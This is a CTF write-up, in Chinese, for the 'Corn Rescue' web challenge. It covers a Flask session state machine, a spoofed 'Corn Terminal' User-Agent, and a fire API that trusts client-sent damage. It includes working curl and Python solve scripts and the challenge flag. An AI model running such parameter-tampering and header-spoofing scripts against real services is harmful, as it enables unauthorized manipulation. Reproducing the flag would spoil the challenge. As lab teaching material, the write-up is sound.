# 极客大挑战（SYC） · 保卫玉米（CORN RESCUE）

> 环境：ctfplus 动态实例，Flask + gunicorn，HTTP
> 日期：2026-10-23
> flag：`SYC{Luckily_th3_c0rn_didnt_turn_int0_p0pc0rn}`

## 一、题目长什么样

首页是一个「厨房门禁」页：烤箱、砧板、举着 HELP 牌的小玉米，右下角一张 CHEF CHECK-IN 卡片，直接把第一步请求写在上面：

| 字段 | 值 |
|---|---|
| COUNTER | `/` |
| METHOD | `GET` |
| name | `cornguard` |

响应头 `Server: gunicorn`，说明后端是 Flask。整题是**引导式**的：每一步的下一步都写在页面文案里，不需要爆破目录。

## 二、四段状态机

服务端用 Flask 签名 session 串起四个阶段：

| 阶段 | 请求 | 结果 |
|---|---|---|
| 1 | `GET /?name=cornguard` | 200，session payload 变成 `{"stage":"join"}` |
| 2 | `POST /join`，body `action=join` | 302 到 `/terminal`，payload 变成 `{"stage":"terminal"}` |
| 3 | `GET /terminal`，`User-Agent: Corn Terminal` | 302 到 `/game`，payload 变成 `{"stage":"game"}` |
| 4 | `GET /game` | 游戏页 |

Cookie 长这样：

```
session=eyJzdGFnZSI6InRlcm1pbmFsIn0.<timestamp>.<hmac>
```

前两段是 `base64url(payload).timestamp`，第三段是 HMAC。把第一段解出来就是 `{"stage":"terminal"}`。没有 `SECRET_KEY` 改不了 payload，但也不需要改：按流程走，服务端会发合法的下一阶段 cookie。

> `GET /join?action=join` 实测无效：返回 200 但 session 不推进，必须 POST。

## 三、终端页：设备校验

`/terminal` 页面输出：

```
> chef .............. CORNGUARD
> rescue_order ...... accepted
> current_device .... general browser
> required_device ... Corn Terminal
> nozzle_control .... locked
```

前面都对，只差「设备」。服务端拿 `User-Agent` 做门禁，要求**严格等于** `Corn Terminal`：

| UA | 结果 |
|---|---|
| `Corn Terminal` | 302 `/game` |
| `corn terminal` | 200，留在本页 |
| `Corn Terminal/1.0` | 200，留在本页 |
| `Mozilla/5.0 Corn Terminal` | 200，留在本页 |

大小写敏感、不支持子串、不支持版本号。用 curl 加 `-A "Corn Terminal"` 即可；API 阶段（`/api/*`）不再校验 UA。

## 四、游戏与真正的漏洞

`/game` 加载 `/static/game.js`，三个接口：

| 接口 | 作用 |
|---|---|
| `POST /api/start` | 开局 |
| `POST /api/fire` | 发射，body `{"damage": ...}` |
| `GET /api/state` | 轮询敌人距离 |

三波配置：

| 波次 | 敌人 | HP | 默认 35 伤害需要 |
|---|---|---|---|
| 1 | 侦察蠕虫 | 70 | 2 发 |
| 2 | 装甲甲虫 | 105 | 3 发 |
| 3 | 收割者 BOSS | 9999 | 286 发 |

前端把服务端下发的 `battle.default_damage` 原样塞进请求体：

```js
body: JSON.stringify({damage: battle.default_damage})
```

但 `/api/fire` **直接采用客户端提交的 `damage`**，没有上限、没有和武器绑定。BOSS 固定 9999 血，正常 35 伤害打不死；把请求改成：

```json
{"damage": 9999}
```

一发清空 BOSS，响应里直接带 flag：

```json
{"battle":{"hp":0,"max_hp":9999,"sprite":"boss","status":"victory"},
 "flag":"SYC{Luckily_th3_c0rn_didnt_turn_int0_p0pc0rn}"}
```

## 五、最小复现

用 cookie jar 串完流程：

```bash
BASE="http://<instance>"
JAR="jar.txt"
curl -s -c $JAR "$BASE/?name=cornguard"
curl -s -b $JAR -c $JAR -X POST -d "action=join" "$BASE/join"
curl -s -b $JAR -c $JAR -A "Corn Terminal" "$BASE/terminal"
curl -s -b $JAR -c $JAR -A "Corn Terminal" "$BASE/game"
curl -s -b $JAR -c $JAR -X POST "$BASE/api/start"
for i in 1 2 3; do
  curl -s -b $JAR -c $JAR -X POST -H "Content-Type: application/json" -d '{"damage":9999}' "$BASE/api/fire"
  echo
done
```

Python 版本更短：

```python
import requests

BASE = "http://<instance>"
s = requests.Session()
s.headers["User-Agent"] = "Corn Terminal"

s.get(f"{BASE}/?name=cornguard")
s.post(f"{BASE}/join", data={"action": "join"})
s.get(f"{BASE}/terminal")
s.get(f"{BASE}/game")
s.post(f"{BASE}/api/start")

for _ in range(3):
    r = s.post(f"{BASE}/api/fire", json={"damage": 9999}).json()
print(r.get("flag"))
```

## 六、踩过的坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 把参数放 URL 当 GET 传 | 页面空白 / 不推进 | `/join`、`/api/fire` 要 POST；`content` 类字段要放在 body |
| 手抄一次 cookie 连发 | 第二发 `409 NO_ACTIVE_BATTLE` | 战斗状态存在 session 里，每次 `start`/`fire` 都会换新 cookie；用 `-c` 写回或 `requests.Session` |
| 用 form 发 `damage` | `400 INVALID_JSON` | 必须 `Content-Type: application/json` |
| 只访问 `/game` 不带 UA | 302 回 `/` | `/terminal` 的 UA 校验没过，session 还停在 `terminal` |
| 在浏览器里慢慢点 | `敌人突破防线，玉米核心已失守` | 每波有十几秒倒计时，`approach` 涨到 1 判负；脚本连发即可 |
| 以为要打完 286 发 | 时间根本不够 | BOSS 是提示你「伤害可篡改」，不是让你硬打 |

## 七、可复用的方法

1. **引导式靶场先读文案**：下一步的路径、方法、参数名通常直接写在页面卡片里，比目录爆破快。
2. **看 Cookie 判断状态机**：Flask 的 session 是「base64 payload + 签名」，解码能看清 `stage`，但不要试图伪造。
3. **改头是最弱的门禁**：UA、Referer、XFF 都是客户端可控的，适合当第一层，不能当唯一一层。
4. **客户端提交的数值一律不可信**：伤害、价格、数量、积分，只要服务端直接拿来用，就是漏洞。
5. **读前端 JS 找 API**：接口路径、请求体结构、字段名都在里面，比猜快。

## 附：同类题特征

| 特征 | 说明 |
|---|---|
| 页面有 `stage` / `level` 之类的进度 | 大概率是 session 状态机，按顺序走 |
| 「只有 XX 设备 / 终端才能访问」 | 先想 User-Agent、Referer、自定义头 |
| 小游戏有血条 / 伤害 / 金币 | 先抓包看数值是不是客户端算的 |
| 页面直接写「送到 /xxx，回执写 action=...」 | 出题人送的路线图，照着走 |
